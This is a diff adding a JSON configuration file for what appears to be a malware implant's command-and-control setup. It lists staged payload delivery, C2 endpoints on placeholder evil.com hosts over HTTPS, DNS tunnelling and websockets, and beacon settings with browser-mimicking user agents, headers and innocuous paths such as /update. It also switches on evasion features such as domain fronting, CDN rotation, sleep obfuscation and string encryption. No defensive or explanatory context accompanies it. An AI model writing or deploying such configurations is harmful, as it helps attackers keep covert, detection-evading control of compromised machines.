@@ -1,0 +1,36 @@
+{
+    "delivery": {
+        "staged": true,
+        "stage1_size": 512,
+        "stage2_size": 4096,
+        "protocols": ["https", "dns", "websocket"],
+        "jitter": 0.2,
+        "interval": 300,
+        "max_retries": 5
+    },
+    "c2": {
+        "primary": "https://c2.evil.com:8443",
+        "fallback": "https://backup.evil.com:443",
+        "dns_tunnel": "tunnel.evil.com",
+        "websocket": "wss://ws.evil.com:8080",
+        "cdn_endpoints": ["cdn1.cloudflare.com", "cdn2.cloudfront.net"]
+    },
+    "beacon": {
+        "user_agents": [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+        ],
+        "headers": {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate"
+        },
+        "paths": ["/update", "/check", "/status", "/sync"]
+    },
+    "evasion": {
+        "domain_fronting": true,
+        "cdn_rotation": true,
+        "sleep_obfuscation": true,
+        "string_encryption": true
+    }
+}
